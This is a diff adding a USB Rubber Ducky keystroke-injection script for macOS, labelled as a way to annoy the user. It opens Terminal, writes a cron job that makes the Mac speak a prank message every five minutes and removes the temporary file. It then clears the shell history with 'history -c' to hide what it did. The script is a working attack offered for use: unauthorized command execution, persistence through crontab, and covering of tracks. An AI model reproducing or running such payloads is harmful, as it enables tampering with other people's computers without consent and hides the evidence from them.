@@ -1,0 +1,40 @@
+REM >>> -------------
+REM TANGONINE
+REM FEB 10 2021
+REM Annoy the user via SAY commmand
+REM >>> -------------
+
+DEFAULTDELAY 2000
+CTRL SPACE
+DELETE
+STRING terminal.app
+ENTER
+DELAY 2000
+
+STRING nano cron.txt
+ENTER
+DELAY 1000
+STRING */5 * * * * say "[[slnc 10000]] this is a surprise [[slnc 10000]] Hey seeri [[slnc 2000]] what time is it"
+ENTER
+DELAY 2000
+CTRL x
+DELAY 2000
+STRING y
+ENTER
+DELAY 2000
+
+STRING crontab cron.txt
+ENTER
+DELAY 1000
+ENTER
+DELAY 1000
+STRING rm cron.txt
+DELAY 500
+ENTER
+DELAY 1000
+
+DELAY 2000
+STRING history -c
+ENTER
+DELAY 2000
+GUI q
